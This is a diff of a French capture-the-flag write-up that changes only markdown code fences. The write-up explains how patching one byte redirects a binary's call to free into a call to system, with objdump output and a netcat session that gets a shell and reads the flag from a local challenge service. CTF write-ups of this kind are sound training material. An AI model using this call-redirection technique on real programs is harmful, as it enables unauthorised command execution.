@@ -6,7 +6,7 @@ Comme la solution joue sur des offsets, les scripts de solution peuvent changé 
 
 Pour résoudre ce challenge, il suffit de remplacer l'appel à free par un appel à system. Deplus, il est possible que certaine compilation ne permette pas d'éxecuter cette solution. Pour ma part, j'ai :
 
-`
+```
 $ objdump -M intel -d changebyone
 ...
 0000000000000730 <free@plt>:
@@ -23,13 +23,13 @@ $ objdump -M intel -d changebyone
  9f7:	e8 34 fd ff ff       	call   730 <free@plt>
  9fc:	b8 00 00 00 00       	mov    eax,0x0
 ...
-`
+```
 
 On a un écart de +0x20 entre les plt de free et system. Deplus, l'octet à modifier est à l'indice 0x9f8 du fichier.
 
 Il faut donc rentrer :
 
-`
+```
 $ nc 127.0.0.1 5796
 Hi,
 
@@ -49,4 +49,4 @@ changebyone.py
 passwd
 cat passwd
 THC??{can_you_change_me}
-`
+```
